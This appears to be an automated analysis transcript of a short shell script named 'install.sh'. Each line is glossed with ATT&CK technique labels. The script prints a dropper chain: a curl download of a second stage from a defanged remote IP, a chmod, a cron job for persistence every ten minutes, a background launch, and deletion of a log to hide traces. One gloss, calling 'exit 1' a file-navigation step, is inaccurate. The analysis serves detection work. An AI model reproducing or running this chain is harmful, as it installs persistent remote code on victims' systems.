# `install.sh`: interlinear transcript

Sources: `install.sh` (sha256 `6b7c5f564d8a`…, 9 lines)

Glosses: 4 rule, 0 model, 0 analyst, 4 none, 1 pending · rules `2026.10.7` · ATT&CK `20.0`

## `install.sh`

```text
   1  #!/bin/sh
      [context]
      A comment, or a script's interpreter line (#!); context, it runs nothing.

   2  # stage two
      [context]
      A comment, or a script's interpreter line (#!); context, it runs nothing.

   3  cd /tmp
      [context]
      Moves around or lists files; context, not an attack technique.

   4  exit 1
      [context]
      Moves around or lists files; context, not an attack technique.

   5  curl -s hxxp://203.0.113[.]5/stage2 -o .s2
      T1105 Ingress Tool Transfer   [rule: download-file]
      Downloads a file from a remote host to disk.

   6  chmod 755 .s2
      T1222.002 Linux and Mac Permissions   [rule: chmod-exec]
      Makes a file executable, typically a payload that was just downloaded.

   7  (crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.s2') | crontab -
      T1053.003 Cron   [rule: cron]
      Creates or edits a cron job so a command runs on a schedule.

   8  ./.s2 >/dev/null 2>&1 &
      [pending]

   9  rm -f .s2.log
      T1070.004 File Deletion   [rule: file-deletion]
      Deletes files that look like intrusion traces (temporary or hidden paths, the running script, dropped tools), or shreds files.
```
